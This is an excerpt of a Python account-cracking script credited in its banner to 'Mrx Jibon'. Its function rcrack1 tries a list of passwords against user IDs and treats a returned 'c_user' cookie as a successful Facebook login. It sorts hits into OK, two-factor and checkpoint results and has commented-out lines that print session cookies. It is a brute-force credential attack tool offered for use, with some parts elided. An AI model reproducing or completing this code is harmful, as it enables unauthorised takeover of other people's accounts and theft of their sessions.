...
\x1b[1;96m     YP  YP  YP 88   YD YP    YP  \033[1;32mMrx Jibon                                                               
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [\033[38;5;46mMRX\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m]  [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\x1b[38;5;46m[JIBON-OK] '+uid+' | '+ps+ '  ')
                #print(f" Cookie : {coki}")
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\x1b[38;5;45m[JIBON-2F] '+uid+' | '+ps+ '  ')
                  ...
                  #  os.system("play-audio HAMII_CP.mp3")
                    #print(f'\r\x1b[38;5;191m[JIBON-CP] [☠️] '+uid+' . '+ps+' '+Jawnx(uid)+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f' \r\033[m[MRX] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
